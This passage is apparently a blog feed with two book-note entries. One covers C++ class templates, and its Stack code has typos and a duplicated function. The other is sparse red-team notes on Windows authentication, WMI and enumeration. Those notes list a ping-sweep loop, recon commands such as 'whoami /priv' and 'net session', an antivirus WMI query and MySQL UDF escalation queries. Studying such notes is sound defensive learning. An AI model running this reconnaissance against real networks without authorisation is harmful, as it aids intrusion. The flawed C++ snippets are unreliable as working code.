class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//stack1.hpp<br>#include &lt;vector&gt;<br>#include &lt;cassert&gt;<br><br>template&lt;typename T&gt;<br>class Stack &#123;<br>private:<br>  std::vecotr&lt;T&gt; elems; //elements<br><br>public:<br>  void push(T const&amp; elem); //push element<br>  void pop(); //pop element<br><br>  T const&amp; top() const; //return top element<br>  bool empty() const &#123; //return whether the stack is empty.<br>    return elems.empty();<br>  &#125;<br>&#125;<br><br>template&lt;typename T&gt;<br>void Stack&lt;T&gt;::push (T const&amp; elem)<br>&#123;<br>  elems.push_back(elem); //append copy of passed elem<br>&#125;<br><br>template&lt;typename T&gt;<br>void Stack&lt;T&gt;::push (T const&amp; elem)<br>&#123;<br>  elems.push_back(elem);<br>&#125;<br><br>template&lt;typename T&gt;<br>void Stack&lt;T&gt;::pop()<br>&#123;<br>  assert(!elems.empty());<br>  elems.pop_back();<br>&#125;<br><br>template&lt;typename T&gt;<br>T const&amp; Stack&lt;T&gt;::top() const<br>&#123;<br>  assert(!elems.empty());<br>  return elems.back();<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>If, for example, you have to declare your own copy constructor and assignment operator, it typically looks like this:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>class Stack &#123;<br>  ...<br>  Stack (Stack const&amp;);             //copy constructor<br>  Stack&amp; operator= (Stack const&amp;);  //assignment operator<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><br>which is formally equivalent to:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>class Stack &#123;<br>  ...<br>  Stack (Stack&lt;T&gt; const&amp;);<br>  Stack&lt;T&gt;&amp; operator= (Stack&lt;T&gt; const&amp;);<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><br>but usually the <code>&lt;T&gt;</code> signals special handling of special template parameters, so it’s usually better to use the first form.</p><p>However, outside the class structure you’d need:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>bool operator== (Stack&lt;T&gt; const&amp; lhs, Stack&lt;T&gt; const&amp; rhs);<br></code></pre></td></tr></table></figure><br>Note that in place where the name and not type of the class is required, only <code>Stack</code> may be used.</p><h3 id="Implementation-of-Member-Functions"><a href="#Implementation-of-Member-Functions" class="headerlink" title="Implementation of Member Functions"></a>Implementation of Member Functions</h3><p>To define a member function of a class template, you have o specify that it is a template, and you have to use the full type qualification of the class template.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>void Stack&lt;T&gt;::push(T const&amp; elem)<br>&#123;<br>  elems.push_back(elem); //append copy of passed elem.<br>&#125;<br></code></pre></td></tr></table></figure><p>In this case, <code>push_back()</code> of the element vector is called, which appends the element at the end of the vector.</p><p>Note that <code>pop_back()</code> of vector removes the last elemtn but does not return it.<br>It is impossible to implement a completely exception-safe version of <code>pop()</code> that returns the removed. However, ignoring this danger, we could implement a <code>pop()</code> that returns the element just removed.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>T Stack&lt;T&gt;::pop()<br>&#123;<br>  assert(!elems.empty());<br>  T elem = elems.back();  //save copy of last element.<br>  elems.pop_back();       //remove last element.<br><br>  return elem;            //return copy of saved element.<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="2-2-Use-of-Class-Template-Stack"><a href="#2-2-Use-of-Class-Template-Stack" class="headerlink" title="2.2 - Use of Class Template Stack"></a>2.2 - Use of Class Template <code>Stack</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//stack1.cpp<br>#include &quot;stack1.hpp:<br>#include &lt;iostream&gt;<br>#include &lt;string&gt;<br><br>int main()<br>&#123;<br>  Stack&lt;int&gt; intStack;<br>  Stack&lt;std::string&gt; stringStack;<br><br>  //manipulate int stack<br>  intStack.push(7);<br>  std::cout &lt;&lt; intStack.top() &lt;&lt; &#x27;\n&#x27;;<br><br>  //manipulate string stack<br>  stringStack.push(&quot;hello&quot;);<br>  std::cout &lt;&lt; stringStack.top() &lt;&lt; &#x27;\n&#x27;;<br>  stringStack.pop();<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>An instantiated class template’s type can be used just like any other type.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void foo(Stack&lt;int&gt; const&amp; s)   //parameter `s` is `int` stack.<br>&#123;<br>  using IntStack = Stack&lt;int&gt;;  //IntStack is another name for `Stack&lt;int&gt;`.<br>  Stack&lt;int&gt; istack[10];        //`istack` is an array of 10 `int` stacks.<br>  IntStack istack2[10];         //`istack2` is also an array of 10 `int` stacks (same type).<br>&#125;<br></code></pre></td></tr></table></figure></p><hr><p>Template arguments may be any type, such as pointers to <code>float</code> or even stack of <code>int</code>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Stack&lt;float*&gt; flatPtrStack;       //stack of `float` pointers.<br>Stack&lt;Stack&lt;int&gt;&gt; intStackStack;  //stack of stack of ints.<br></code></pre></td></tr></table></figure></p><p>Note that before C++11 you had to put whitespace between the two closing template brackets:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Stack&lt;Stack&lt;int&gt; &gt; intStackStack; // OK with all C++ versions<br></code></pre></td></tr></table></figure><br>If you didn’t do this, you were using operator &gt;&gt;, which resulted in a syntax error:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Stack&lt;Stack&lt;int&gt;&gt; intStackStack; // ERROR before C++11<br></code></pre></td></tr></table></figure><br>The reason for the old behavior was that it helped the first pass of a C++ compiler to tokenize the<br>source code independent of the semantics of the code</p><h2 id="2-3-Partial-Usage-of-Class-Templates"><a href="#2-3-Partial-Usage-of-Class-Templates" class="headerlink" title="2.3 - Partial Usage of Class Templates"></a>2.3 - Partial Usage of Class Templates</h2><p>Instead of print the stack contents with <code>printOn</code> it is better to implement <code>operator&lt;&lt;</code> for the stack. However, as usual <code>operator&lt;&lt;</code> has to be implemented as nonmember function, which then could call printOn() inline:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>class Stack &#123;<br>  ...<br>  void printOn() (std::ostream&amp; strm) const &#123;<br>    ...<br>  &#125;<br><br>  friend std::ostream&amp; operator&lt;&lt; (std::ostream&amp; strm, Stack&lt;T&gt; const&amp; s) &#123;<br>    s.printOn(strm);<br>    return strm;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></p><h2 id="2-4-Friends"><a href="#2-4-Friends" class="headerlink" title="2.4 - Friends"></a>2.4 - Friends</h2><h2 id="2-5-Specializations-of-Class-Templates"><a href="#2-5-Specializations-of-Class-Templates" class="headerlink" title="2.5 - Specializations of Class Templates"></a>2.5 - Specializations of Class Templates</h2><p>Specializing class templates allows you to optimize<br>implementations for certain types or to fix a misbehavior of certain types for an instantiation of the class template.</p><p>If you specialize a class template, you must also specialize all member functions. Although it is possible to specialize a single member function of a class template, once you have done so, you can no longer specialize the whole class template instance that the specialized member belongs to.</p><p>To specialize a class template, you have to declare the class with a leading <code>template&lt;&gt;</code> and a specification of the types for which the class template is specialized. The types are used as a template argument and must be specified directly following the name of the class:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;&gt;<br>class Stack&lt;std::string&gt; &#123;<br>  ...<br>&#125;;<br></code></pre></td></tr></table></figure></p><p>For these specializations, any definition of a member function must be defined as an “ordinary” member function, which each occurence of <code>T</code> begin replaced by the specialized type:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void Stack&lt;std::string&gt;::push (std::string const&amp; elem)<br>&#123;<br>  elems.push_back(elem);<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="2-6-Partial-Specialization"><a href="#2-6-Partial-Specialization" class="headerlink" title="2.6 - Partial Specialization"></a>2.6 - Partial Specialization</h2><p>Class templates can be partially specialized. You can provide special implementations for particular circumstances, but some template parameters must still be defined by the user.</p><p>For example, we can define a special implementation of class `Stack&gt; for pointers:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &quot;stack1.hpp&quot;<br><br>template&lt;typename T&gt;<br>class Stack&lt;T*&gt; &#123;<br>private:<br>  std::vector&lt;T*&gt; elems;<br><br>public:<br>  void push(T*);<br>  T* pop();<br>  T* top() const;<br><br>  bool empty() const &#123;<br>    return elems.empty();<br>  &#125;<br>&#125;<br><br>template&lt;typename T&gt;<br>void Stack&lt;T*&gt;::push (T* elem)<br>&#123;<br>  elems.push_back(elem);<br>&#125;<br><br>template&lt;typename T&gt;<br>T* Stack&lt;T*&gt;::pop()<br>&#123;<br>  assert(!elems.empty());<br>  T* p = elems.back();<br>  elems.pop_back();<br>  return p;<br>&#125;<br><br>template&lt;typename T&gt;<br>T* Stack&lt;T*&gt;::top() const<br>&#123;<br>  assert(!elems.empty());<br>  return elems.back();<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="2-7-Default-Class-Template-Arguments"><a href="#2-7-Default-Class-Template-Arguments" class="headerlink" title="2.7 - Default Class Template Arguments"></a>2.7 - Default Class Template Arguments</h2><h2 id="2-8-Type-Aliases"><a href="#2-8-Type-Aliases" class="headerlink" title="2.8 - Type Aliases"></a>2.8 - Type Aliases</h2><h2 id="2-9-Class-Template-Argument-Deduction"><a href="#2-9-Class-Template-Argument-Deduction" class="headerlink" title="2.9 - Class Template Argument Deduction"></a>2.9 - Class Template Argument Deduction</h2><h2 id="2-10-Templatized-Aggregates"><a href="#2-10-Templatized-Aggregates" class="headerlink" title="2.10 - Templatized Aggregates"></a>2.10 - Templatized Aggregates</h2><h1 id="Chapter-3-Nontype-Template-Parameters"><a href="#Chapter-3-Nontype-Template-Parameters" class="headerlink" title="Chapter.3 - Nontype Template Parameters"></a>Chapter.3 - Nontype Template Parameters</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    <category term="Book" scheme="http://example.com/categories/Book/"/>
    
    
    <category term="Book" scheme="http://example.com/tags/Book/"/>
    
    <category term="Learning" scheme="http://example.com/tags/Learning/"/>
    
    <category term="Note" scheme="http://example.com/tags/Note/"/>
    
    <category term="Code" scheme="http://example.com/tags/Code/"/>
    
    <category term="Programming" scheme="http://example.com/tags/Programming/"/>
    
    <category term="C++" scheme="http://example.com/tags/C/"/>
    
    <category term="Coding" scheme="http://example.com/tags/Coding/"/>
    
    <category term="Program" scheme="http://example.com/tags/Program/"/>
    
    <category term="Templates" scheme="http://example.com/tags/Templates/"/>
    
  </entry>
  
  <entry>
    <title>[Book] Practical Guide To Red-Blue Confrontation From ATT&amp;CK</title>
    <link href="http://example.com/2026/01/05/2026-1-5-RedBlueConfrontationFromAttCk/"/>
    <id>http://example.com/2026/01/05/2026-1-5-RedBlueConfrontationFromAttCk/</id>
    <published>2026-01-04T16:11:01.000Z</published>
    <updated>2026-01-15T09:20:57.491Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/PracticalGuideToRedBlueConfrontationFromAttCk/libro.png'><img src="/images/books/PracticalGuideToRedBlueConfrontationFromAttCk/libro.png" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Practical Guide To Red-Blue Confrontation From ATT&amp;CK”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><p>This book introduces many practical cybersecurity attack techniques from the perspective of the MITRE ATT&amp;CK framework.</p><p>The majority of the content focuses on attack methods targeting the Windows platform, while Linux is also mentioned in several chapters.</p><p>Compared to several books that I have read before (click <a href="https://iss4cf0ng.github.io/2026/01/02/2026-1-2-NoteLanPenetrationGuidelines/">this one</a>, <a href="https://iss4cf0ng.github.io/2026/01/02/2026-1-2-NotePrivilegeEscalationTechnique/">this one</a> and <a href="https://iss4cf0ng.github.io/2026/01/01/DomainPenetration1/">this one</a>), there are overlapping topics, and most of them primarily discuss Windows security.</p><p>However, this book presents tool usage and penetration techniques in a more practical and broader manner. I believe this is a good book for strengthening your fundamental cybersecurity knowledge and skills, especially if you have already read the three books that I mentioned above.</p><p>This book including:</p><ul><li>Windows Protocols</li><li>Tunneling</li><li>Proxy/Reverse Proxy</li><li>Port Forwarding</li><li>Lateral(Horizontal) Movement</li><li>Many Many Tools</li><li>Persistence</li><li>Several well-known rootkits</li></ul><p>This book not including:</p><ul><li>The underlying principles of Windows Protocols.</li><li>The deep, underlying principles of different methods, such as, port forwarding.</li><li>The underlying principles of exploits.</li><li>How to mastering Cobalt Strike.</li></ul><p>There are typo and several mistakes about Windows Protocols, reader should study them and do the double-check with the official documents.</p><p>This book is suitable for readers who want a practical overview of offensive techniques rather than a deep understanding of underlying mechanisms.</p><p align="center" class='item-img' data-src='/images/meme/mika_smiling.png'><img src="/images/meme/mika_smiling.png" width="400"></p><h1 id="Chapter-1-Fundamentals-of-Windows-Security"><a href="#Chapter-1-Fundamentals-of-Windows-Security" class="headerlink" title="Chapter.1 - Fundamentals of Windows Security"></a>Chapter.1 - Fundamentals of Windows Security</h1><h2 id="1-1-Fundamentals-of-Windows-Authentication"><a href="#1-1-Fundamentals-of-Windows-Authentication" class="headerlink" title="1.1 - Fundamentals of Windows Authentication"></a>1.1 - Fundamentals of Windows Authentication</h2><ol><li>SSPI</li><li>SSP</li><li>Well-Known SSP<ol><li>NTLM</li><li>Kerberos</li><li>Negotiate</li><li>Security Channel</li><li>Digest Authentication</li><li>Cred SSP</li><li>Distributed Password Authentication</li><li>PKU2U</li></ol></li></ol><h2 id="1-3-Security-Authentication-Mechanism-of-Windows"><a href="#1-3-Security-Authentication-Mechanism-of-Windows" class="headerlink" title="1.3 - Security Authentication Mechanism of Windows"></a>1.3 - Security Authentication Mechanism of Windows</h2><h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><ul><li>Ports used by Kerberos:<ol><li>TCP/UDP 88: Authentication and Tickets</li><li>TCP/UDP 464: Kerberos Kpaswd(Reset Password) protocol.</li><li>LDAP: 389</li><li>LDAPS: 636</li></ol></li></ul><p>Terminology of Kerberos<br>| Term | Meaning |<br>| —- | —- |<br>| AS | Authentication Service. |<br>| KDC | Key Distrubution Center. (Domain controller, the most important server in a domain). |<br>| TGT | Ticket Granting Ticket. |<br>| TGS | Ticket Granting Service. |<br>| ST | Service Ticket. |<br>| krbtgt | Every domain has account for <strong>krbtgt</strong>. |<br>| Principal | A unique identity to which Kerberos can assign tickets. |<br>| PAC | Privilege Attribute Certificate. |<br>| SPN | Servic Principal Name. |<br>| Session Key | A temporary key. |<br>| Server Session Key | A temporary key. |<br>| Authenticator | Encryted with Session Key. |<br>| Replay Cache | It has added since Kerberos 5. |</p><h3 id="An-Overview-of-Kerberos-Authentication"><a href="#An-Overview-of-Kerberos-Authentication" class="headerlink" title="An Overview of Kerberos Authentication"></a>An Overview of Kerberos Authentication</h3><ol><li>Client demonstrates it has the correct password by encrypting timestamp with its NTLM hash. This process is also know as <strong>pre-authentication</strong>.</li><li>After successful pre-authentication, the client requests a TGT (Ticket Granting Ticket) from the Authentication Server (AS), which is typically a DC (Domain Controller).</li><li>The client presents its TGT to TGS (Ticket Granting Server) to request access to a specific service. If the TGT is valid, the client receives a ST (Service Ticket) from the KDC’s TGS.</li><li>Client is allowed to access the service on the target server if both the ST and the service authentication are valid</li></ol><h3 id="Details-of-Kerberos-Authentication"><a href="#Details-of-Kerberos-Authentication" class="headerlink" title="Details of Kerberos Authentication"></a>Details of Kerberos Authentication</h3><ol><li><strong>AS-REQ and AS-REP (Interaction between client and AS)</strong>:<ol><li><strong>AS-REQ</strong>:\<br>When a client wants to access resources within a domain, after the user enters a username and password, the client sends an AS-REQ message to the Authentication Server (AS).\<br>The request includes information such as the message type, protocol version, client principal name (username), and pre-authentication.\<br>To prove knowledge of the password, the client encrypts a timestamp using a key derived from the user’s NTLM hash. This encrypted timestamp is included as pre-authentication data.\<br>The AS decrypts the timestamp to verify the client’s credentials. If the verification succeeds, the AS responds with an AS-REP message containing a Ticket Granting Ticket (TGT).</li><li><strong>AS-REP</strong>:</li></ol></li><li><strong>TGS-REQ and TGS-REP (Interaction between client and TGS)</strong>:<ol><li><strong>TGS-REQ</strong>:</li><li><strong>TGS-REP</strong>:</li></ol></li><li><strong>AP-REQ and AP-REP (Interaction between client and server)</strong>:<ol><li><strong>AP-REQ</strong>:</li><li><strong>AP-REP</strong>:</li></ol></li></ol><h2 id="1-4-Windows-Protocols"><a href="#1-4-Windows-Protocols" class="headerlink" title="1.4 - Windows Protocols"></a>1.4 - Windows Protocols</h2><h3 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h3><p>LLMNR (Link-Local Multicast Name Resolution)</p><p>LLMNR Spoofing</p><h3 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h3><p>NetBIOS (Network Basic Input/Output System)</p><h3 id="WPAD"><a href="#WPAD" class="headerlink" title="WPAD"></a>WPAD</h3><p>WPAD (Web Proxy Auto-Discovery) Protocol</p><h2 id="1-5-WMI"><a href="#1-5-WMI" class="headerlink" title="1.5 - WMI"></a>1.5 - WMI</h2><p>WMI (Windows Management Instructmentation) is the essential of Windows XP/2000 system management. User can perform local or remote resource management.</p><p>It supports DCOM (Distributed Component Object Model) and WinRM (Windows Remote Management). It is a useful tool for Win32 operating system. On the other hand, it is a useful tool for fileless attack.</p><h3 id="WQL"><a href="#WQL" class="headerlink" title="WQL"></a>WQL</h3><p>WQL (WMI Query Language) is a SQL of WMI, it has a similar syntaxs to SQL. However, WQL can only be used for data query, it is not allowed to do creation, delete or modification to the instance of a class.</p><h3 id="Example-of-Querying"><a href="#Example-of-Querying" class="headerlink" title="Example of Querying"></a>Example of Querying</h3><p>Basic usage:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT properties[, properties] FROM class [where clause]<br></code></pre></td></tr></table></figure></p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; wbemtest<br></code></pre></td></tr></table></figure><h3 id="WMI-Client"><a href="#WMI-Client" class="headerlink" title="WMI Client"></a>WMI Client</h3><ol><li>PowerShell<ul><li>Get-WmiObject</li><li>Get-CimAssociatedInstance</li><li>Get-CimClass</li><li>Get-CimInstance</li><li>Get-CimSession</li><li>Set-WmiInstance</li><li>Set-CimInstance</li><li>Invoke-WmiMethod</li><li>Invoke-CimMethod</li><li>New-CimInstance</li><li>New-CimSession</li><li>New-CimSessionOption</li><li>Register-CimIndicationEvent</li><li>Register-WmiEvent</li><li>Remove-CimInstance</li><li>Remove-WmiObject</li><li>Remove-CimSession</li></ul></li><li>WBEMTEST</li><li>WinRM</li><li>Win explorer</li><li>WSH</li></ol><h3 id="WMI-Remote-Interactive"><a href="#WMI-Remote-Interactive" class="headerlink" title="WMI Remote Interactive"></a>WMI Remote Interactive</h3><ol><li>DCOM:\<br>DCOM (Distributed Component Object Model) is a set of APIs based on COM, introduced by Microsoft. Before understanding DCOM, it is necessary to understand COM.\<br>COM (Component Object Model) is a standard defined by Microsoft that specifies how software components communicate with each other on the same machine. It allows a client to interact with a component directly, without the need for any intermediate component.\<br>DCOM is an extension of COM that enables clients to use COM objects not only locally but also remotely over a network. This functionality is implemented using RPC (Remote Procedure Call).\<br>DCOM enhances COM by providing support for distributed computing, multiple network protocols, and secure communication.</li><li>WinRM</li></ol><h3 id="WMI-Events"><a href="#WMI-Events" class="headerlink" title="WMI Events"></a>WMI Events</h3><h3 id="Attacking-WMI"><a href="#Attacking-WMI" class="headerlink" title="Attacking WMI"></a>Attacking WMI</h3><ol><li>Information Extraction<ul><li>Computer/System Information: Win32_OperatingSystem, Win32_ComputerSystem</li><li>File/Directory: CIM_DataFile</li><li>Desk: Win32_Volume</li><li>Registry: StdRegProv</li><li>Process: Win32_Process</li><li>Service: Win32_Service</li><li>Event: Win32_NtLogEvent</li><li>Logged Account: Win32_LoggedOnUser, Win32_LogonSession</li><li>Sharing: Win32_Share</li><li>Hotfix: Win32_QuickFixEngineering</li><li>Network: Win32_IP4RouteTable</li><li>User Account: Win32_UserAccount</li><li>User Group: Win32_Group</li></ul></li><li>Anti-Virus<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT * FROM AntiVirusProduct<br></code></pre></td></tr></table></figure></li><li>Lateral Movement</li></ol><h1 id="Chapter-2-Information-Extraction"><a href="#Chapter-2-Information-Extraction" class="headerlink" title="Chapter.2 - Information Extraction"></a>Chapter.2 - Information Extraction</h1><h2 id="2-1-Host-Enumeration"><a href="#2-1-Host-Enumeration" class="headerlink" title="2.1 - Host Enumeration"></a>2.1 - Host Enumeration</h2><h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; for /l %i in (1,1,255) do @ping x.x.x.%i -w 1 -n 1 | find /i &quot;ttl&quot;<br></code></pre></td></tr></table></figure><h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; net use<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; net session<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; ipconfig /displaydns<br></code></pre></td></tr></table></figure><h2 id="2-2-Information-Extraction-on-Windows"><a href="#2-2-Information-Extraction-on-Windows" class="headerlink" title="2.2 - Information Extraction on Windows"></a>2.2 - Information Extraction on Windows</h2><h3 id="User’s-Information-and-Privilege"><a href="#User’s-Information-and-Privilege" class="headerlink" title="User’s Information and Privilege"></a>User’s Information and Privilege</h3><div class="table-container"><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td>net user</td></tr><tr><td>net localgroup administrators</td></tr><tr><td>query user</td></tr><tr><td>whoami /all</td></tr><tr><td>whoami &amp;&amp; whomai /priv</td></tr><tr><td>net localgroup</td></tr></tbody></table></div><h3 id="System-Information"><a href="#System-Information" class="headerlink" title="System Information"></a>System Information</h3><div class="table-container"><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td>ipconfig /all</td></tr><tr><td>wmic service list brief</td></tr></tbody></table></div><h3 id="Network-Information"><a href="#Network-Information" class="headerlink" title="Network Information"></a>Network Information</h3><h2 id="2-2-Information-Extraction-on-Linux"><a href="#2-2-Information-Extraction-on-Linux" class="headerlink" title="2.2 - Information Extraction on Linux"></a>2.2 - Information Extraction on Linux</h2><h1 id="Chapter-3-Tunneling"><a href="#Chapter-3-Tunneling" class="headerlink" title="Chapter.3 - Tunneling"></a>Chapter.3 - Tunneling</h1><h1 id="Chapter-4-Privilege-Escalation"><a href="#Chapter-4-Privilege-Escalation" class="headerlink" title="Chapter.4 - Privilege Escalation"></a>Chapter.4 - Privilege Escalation</h1><h2 id="Windows-Privilege-Escalation"><a href="#Windows-Privilege-Escalation" class="headerlink" title="Windows Privilege Escalation"></a>Windows Privilege Escalation</h2><h3 id="Bad-Configuration"><a href="#Bad-Configuration" class="headerlink" title="Bad Configuration"></a>Bad Configuration</h3><h3 id="DLL-Hijacking"><a href="#DLL-Hijacking" class="headerlink" title="DLL Hijacking"></a>DLL Hijacking</h3><h3 id="Privilege-Escalation-with-3rd-Service"><a href="#Privilege-Escalation-with-3rd-Service" class="headerlink" title="Privilege Escalation with 3rd Service"></a>Privilege Escalation with 3rd Service</h3><ol><li>MySQL UDF<ol><li>What is UDF</li><li>How to do escalation  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql&gt; select @@plugin_dir;<br>mysql&gt; show variables like, %plugin%;    <br></code></pre></td></tr></table></figure></li></ol></li></ol><h1 id="Chapter-5-Credentials-Extraction"><a href="#Chapter-5-Credentials-Extraction" class="headerlink" title="Chapter.5 - Credentials Extraction"></a>Chapter.5 - Credentials Extraction</h1><h1 id="Chapter-6-Lateral-Movement"><a href="#Chapter-6-Lateral-Movement" class="headerlink" title="Chapter.6 - Lateral Movement"></a>Chapter.6 - Lateral Movement</h1><h1 id="Chapter-7-Persistence"><a href="#Chapter-7-Persistence" class="headerlink" title="Chapter.7 - Persistence"></a>Chapter.7 - Persistence</h1><h1 id="Thanks-for-reading"><a href="#Thanks-for-reading" class="headerlink" title="Thanks for reading!"></a>Thanks for reading!</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.png'><img src="/images/meme/mika_nagisa_rollcake.png" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    <category term="Book" scheme="http://example.com/categories/Book/"/>
    
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
